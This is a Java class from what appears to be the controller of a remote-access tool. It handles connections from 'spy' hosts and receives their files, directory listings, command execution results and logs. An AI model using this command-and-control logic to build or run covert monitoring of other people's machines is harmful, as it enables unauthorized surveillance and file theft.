package Commander;

import java.awt.Color;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UTFDataFormatException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.Vector;

import Commander.UI.GUI;

public class AgentThread extends Thread {
	boolean alive=true;
	public static boolean cancel = false;
	Socket sc = null;							
	DataInputStream in = null;
	DataOutputStream out=null;
	FileOutputStream todesk = null;
	Vector<AgentThread> v = null;

	public AgentThread(Socket sc, Vector<AgentThread> v) {
		rc("代理线程被初始化");
		this.sc = sc;
		this.v = v;
		alive=true;
	}

	@Override
	public void run() {
		rc("代理线程启动");
		try {
			in = new DataInputStream(sc.getInputStream());
		} catch (IOException e1) {
			rc("消息通道开启失败");
		}
		boolean flag = true;
		while (alive) {
			String msg ="";
			try {
				msg = in.readUTF();
				rc("收到新消息："+msg);
			} catch(UTFDataFormatException e) {
				rc(3,"数据类型异常消息");
			}catch (IOException e) {
				rc(1,"IO流错误，正在回收线程");
				Commander.lc--;
				// TODO Auto-generated catch block
				for (int i = 0; i < v.size(); i++) {
					AgentThread _1 = v.get(i);
					if (_1.getName().equals(this.getName())) {
						Commander.loc = "NotConnect";
						Commander.path = "";
						Commander.exception=true;
						v.removeElementAt(i);
						Commander.list.remove(i);
						if(GUI.host!=null) {
							GUI.host.setListData(Commander.list);
							GUI.linkCount.setText("连接："+Commander.list.size());
							if(Commander.list.size()==0) {
								GUI.link.setEnabled(false);
								GUI.link.setBackground(new Color(150,150,150));
								GUI.unlink.setEnabled(false);
								GUI.unlink.setBackground(new Color(150,150,150));
							}
						}
						// 更新列表功能待实现
						Commander.linked=true;
						break;
					}
				}
				flag = false;
				Commander.finished=true;
				if (!flag) {
					return;
				}
				if(Commander.gui!=null) {
					GUI.unlink.setEnabled(false);
					GUI.unlink.setBackground(new Color(150,150,150));
					GUI.link.setEnabled(true);
					GUI.unlink.setBackground(new Color(150,150,150));
				}
				refresh();
				close();
			}
			if (msg.startsWith("<#NAME#>")) {//spy的连接请求
				rc("验证主机是否重复加入");
				boolean canjoin=true;
				String name = msg.substring(8).trim();
				for(int i=0;i<v.size();i++) {
					AgentThread at=v.get(i);
					if(at.getName().equals(name)) {
						try {
							DataOutputStream dos=new DataOutputStream(sc.getOutputStream());
							dos.writeUTF("<#SAME#>");
						} catch (IOException e) {}
						canjoin=false;
					}
				}
				if(!canjoin) {
					rc("阻止重复主机加入");
					break;
				}
				this.setName(name);
				v.addElement(this);
				Commander.list.add(this.getName());
				if(GUI.host!=null) {
					GUI.host.setListData(Commander.list);
					GUI.linkCount.setText("连接："+Commander.list.size());
				}
				
			} else if (msg.startsWith("<#MSG#>")) {
				msg(msg);
			} else if (msg.startsWith("<#getfile#>")) {
				getfile(msg);
				try {
					refresh();
					System.out.print(">>");
				} catch (Exception e) {}
			} else if (msg.startsWith("<#ip#>")) {
				GUI.IP=msg.substring(6).trim();
				ip(msg);
				try {
					Commander.wd.interrupt();// 打不死的小强
				} catch (Exception e) {
				}
			} else if (msg.startsWith("<#desk#>")) {
				desk(msg);
				System.out.print(">>");
				Commander.wd.interrupt();
			} else if (msg.startsWith("<#all#>")) {
				tailsall(msg);
			} else if (msg.startsWith("<#tree#>")) {
				tree(msg);
				refresh();
			} else if (msg.startsWith("<#leave#>")) {
				leave(flag);
				try {
					Commander.wd.interrupt();
				} catch (Exception e) {
				}

			} else if (msg.startsWith("<#successful#>")) {
				try {
					Thread.sleep(100);
				} catch (InterruptedException e1) {
				}
				System.out.print("suc>>");
				Commander.exist = true;
				try {
					Commander.wd.interrupt();
				} catch (Exception e) {
				}
			} else if (msg.startsWith("<#fail#>")) {
				try {
					Thread.sleep(100);
				} catch (InterruptedException e1) {
				}
				System.out.print("fai>>");
				Commander.exist = false;
				try {
					Commander.wd.interrupt();
				} catch (Exception e) {
				}
			} else if (msg.startsWith("<#execfail#>")) {
				try {
					Thread.sleep(100);
				} catch (InterruptedException e1) {
				}
				if(GUI.news!=null) {
					GUI.news.setText("操作名：run\n");
					GUI.news.append("状态：失败");
					GUI.news.append("其它：X");
				}
				System.out.print("fai>>");

				try {
					Commander.wd.interrupt();
				} catch (Exception e) {
				}
				Commander.finished=true;
			} else if (msg.startsWith("<#execed#>")) {
				try {
					Thread.sleep(100);
				} catch (InterruptedException e1) {
				}
				System.out.print(msg.substring(10)+"\nsuc>>");
				if(GUI.news!=null) {
					GUI.news.setText("操作名：run\n");
					GUI.news.append("状态：成功");
					GUI.news.append("其它：X");
				}
				try {
					Commander.wd.interrupt();
					Commander.finished=true;
				} catch (Exception e) {
				}
			} else if (msg.startsWith("<#input#>")) {
				System.out.print("suc>>");
				try {
					Commander.wd.interrupt();// 打不死的小强
				} catch (Exception e) {
				}
			} else if (msg.startsWith("<#inputfail#>")) {
				try {
					Commander.wd.interrupt();// 打不死的小强
				} catch (Exception e) {
				}
				System.out.print("fai>>");
			} else if(msg.startsWith("<#FA#>")) {
				System.out.print("x");
				Commander.faC++;
			} else if(msg.startsWith("<#SU#>")) {
				System.out.print("-");
				Commander.faC++;
			} else if(msg.startsWith("<#END#>")) {
				Commander.end=true;
			}else if(msg.startsWith("<#simpleall#>")) {//获取所有的文件名没有详情
				all(msg);
				try {
					Commander.wd.interrupt();
				} catch (Exception e) {
				}
				Commander.finished=true;
			}else if(msg.startsWith("<#OpenPort#>")) {
				if(openPort(msg.substring(12))) {
					Commander.monitor=new Monitor();
					Commander.monitor.setDaemon(true);
					Commander.monitor.start();
				}
			}else if(msg.startsWith("<#log#>")) {
				logcat(msg.substring(7));
			}else if(msg.startsWith("<#LOG_FI#>")) {
				Commander.wd.interrupt();
			}else if(msg.startsWith("<#INITDISK#>")){
				Commander.path=msg.substring(12);
				Commander.finished=true;
			}
			
		}
	}
	public boolean openPort(String msg) {
		try {
			boolean f=openP(msg);
			if(f) {
				out.writeUTF("<#OpenSuccess#>");
				return true;
			}
			return false;
		} catch (NumberFormatException e) {
		} catch (IOException e) {
			try {
				out.writeUTF("<#OpenFail#>");
			} catch (IOException e1) {
			}
		}
		return false;
	}
	public boolean  openP(String msg) {
		try {
			Commander.tem=new ServerSocket(Integer.parseInt(msg.trim()));
			out=new DataOutputStream(sc.getOutputStream());
		} catch (NumberFormatException | IOException e) {
			try {
				Commander.tem.close();
			} catch (Exception e1) {}
			try {
				out.close();
			} catch (Exception e1) {}
			// TODO Auto-generated catch block
			return false;
		}
		return true;
	}
	private void leave(boolean flag) {
		// TODO Auto-generated method stub
		for (int i = 0; i < v.size(); i++) {
			AgentThread _1 = v.get(i);
			if (_1.getName().equals(this.getName())) {
				Commander.loc = "Unlink";
				Commander.path = "";
				v.removeElementAt(i);
				Commander.list.remove(i);
				if(GUI.host!=null) {
					GUI.host.setListData(Commander.list);
					GUI.linkCount.setText("连接："+Commander.list.size());
					if(Commander.list.size()==0) {
						GUI.link.setEnabled(false);
						GUI.link.setBackground(new Color(150,150,150));
						GUI.unlink.setEnabled(false);
						GUI.unlink.setBackground(new Color(150,150,150));
					}
				}
				refresh();
				close();
				// 更新列表功能待实现
				break;
			}
		}
		Commander.lc--;
		flag = false;
		if(Commander.gui!=null) {
			GUI.unlink.setEnabled(false);
			GUI.unlink.setBackground(new Color(150,150,150));
			GUI.link.setEnabled(true);
			GUI.unlink.setBackground(new Color(150,150,150));
		}
	}

	private void tree(String msg) {
		// TODO Auto-generated method stub
		System.out.print("\n" + msg.substring(8));
		Commander.wd.interrupt();
	}
	public AgentThread() {//外部测试接口
		
	}
	public void all(String msg) {
		// TODO Auto-generated method stub
		String[] s = msg.substring(13).split("\n");
		int []tongji=new int[6];//统计行
		int []target=new int[6];
		int l=0;//统计专用下标
			for (int i=0;i<s.length;i++) {//遍历文件名
				if(tongji[l]<s[i].trim().getBytes().length) {
					tongji[l]=s[i].trim().getBytes().length;
					if(tongji[l]%8!=0) {
						target[l]=tongji[l]+(8-(tongji[l]%8))+8;
					}else {
						target[l]=(tongji[l])+8;
					}
				}
				if((i+1)%6==0) {
					l=0;
					continue;
				}
				l++;
			}
			l=0;
			for (int i=0;i<s.length;i++) {//按格式打印
				System.out.print(s[i].trim());
				int ta=s[i].trim().getBytes().length;
				for(;ta<target[l];) {
					if(ta%8!=0) {
						ta=ta+(8-(ta%8));
						System.out.print("\t");
					}else {
						ta=(ta)+8;
						System.out.print("\t");
					}
				}
				if((i+1)%6==0) {
					l=0;
					System.out.print("\r\n");
					continue;
				}
				l++;
			}
			
		try {Commander.wd.interrupt();}catch(Exception e) {}
	}

	private void desk(String msg) {
		// TODO Auto-generated method stub
		String[] str = msg.substring(8).split(" ");
		ArrayList<ArrayList<String>> ar=new ArrayList<>();
		ArrayList<String>title=new ArrayList<>();
		title.add("symbol");
		title.add("Size");
		for (String s : str) {
			ArrayList<String> item=new ArrayList<>();
			item.add(s.substring(0,s.indexOf("*")));
			item.add(s.substring(s.indexOf("*")+1));
			ar.add(item);
		}
		Commander.table.getTableFormat(ar);
		Commander.table.showTable();
	}

	public void getfile(String msg) {
		String filename=Commander.locDesk + msg.substring(11).trim();
		boolean exist=new File(Commander.locDesk).exists();
		try {
			todesk = new FileOutputStream(filename);
		} catch (FileNotFoundException e1) {
			if(exist) {
				System.out.print("\n下载文件到此路径需要更高的系统权限！");
				byte[]b=new byte[1024];
				int len=0;
				try {
					new DataOutputStream(Commander.stem.getOutputStream()).writeUTF("<#CANCEL#>");
				} catch (Exception e) {}
				try {
					while((len=in.read(b))>0) {																	//将远程发过的残余消息回收
						if(new String(b,0,len).equals("wfdfadfe*fdf548")) {
							break;
						}
					}
				} catch (IOException e2) {}
				return;
			}
			System.out.print("\nno that directory>>");
			return;
		}
		byte[] b = new byte[2048];

		int len = 0;
		try {
			rc("开始获取资源");
			while ((len = in.read(b)) > 0) {
				// 判断对方是否发送文件结束的命令
				if (new String(b, 0, len).equals("wfdfadfe*fdf548")) {
					break;
				}
				todesk.write(b, 0, len);
				
			}
			rc("完成资源获取");
		} catch (Exception e) {
			rc("传输中断，因为主机离线");
		}
		if (!cancel) {
			try {
				todesk.flush();
				rc("刷新输出流");
			} catch (IOException e) {
			}
		} else {
			try {
				todesk.close();
				rc("关闭输出流");
			} catch (IOException e) {}
			new File(filename).delete();
		}
		cancel = false;
		try {
			todesk.close();
		} catch (IOException e) {
		}
	}

	public void msg(String msg) {
		System.out.print("\n" + msg.substring(7).trim());
	}

	public void ip(String msg) {
		String s = msg.substring(6);
		System.out.print(s);
		try {
			Commander.wd.interrupt();
		}catch(NullPointerException e) {}
	}
	public void tailsall(String msg) {
		System.out.print("\n"+msg.substring(7));
	}
	public void logcat(String len) {					//指定日志文件个数
		int length=Integer.parseInt(len.trim());
		String filename=null;
		File f=new File("properties/spylogs");
		if(!f.exists()) {
			f.mkdirs();
		}
		BufferedWriter bw=null;
		FileWriter o=null;
		for(int i=0;i<length;i++) {
			try {
				filename=in.readUTF().substring(10);
				o=new FileWriter(new File(f,filename));
				bw=new BufferedWriter(o);
				String te=null;
				while((te=in.readUTF())!=null){
					if(te.equals("21341343")) {
						break;
					}
					bw.write(te+"\r\n");
				}
				bw.close();
			} catch (IOException e) {e.printStackTrace();}
		}
		System.out.print("fin>>");
		Commander.wd.interrupt();
	}
	private void rc(int status,String msg) {
		// TODO Auto-generated method stub
		Commander.log.record(status, msg);
	}
	private void rc(String msg) {
		rc(1,msg);
	}
	private void refresh() {
		// TODO Auto-generated method stub
		if(Commander.tem!=null&&!Commander.tem.isClosed()) {
			try {
				Commander.tem.close();
			} catch (IOException e) {}
		}
		Commander.tem=null;
		if(Commander.stem!=null&&!Commander.stem.isClosed()) {
			try {
				Commander.stem.close();

			} catch (IOException e) {}

		}
		Commander.stem=null;
		Monitor.alive=false;
		if(Commander.wd!=null&&!Commander.wd.isInterrupted()) {
			Commander.wd.interrupt();// 打不死的小强
		}
		rc("关闭副端口，释放资源");
	}
	private void close() {				//关闭当前主机的连接时释放资源
		Commander.linked=true;
		if(out!=null) {
			try {
				out.close();
			} catch (IOException e) {}
		}
		if(in!=null) {
			try {
				in.close();
			} catch (IOException e) {}
		}
		if(sc!=null&&!sc.isClosed()) {
			try {
				sc.close();
			} catch (IOException e) {}
		}
		alive=false;
	}
}
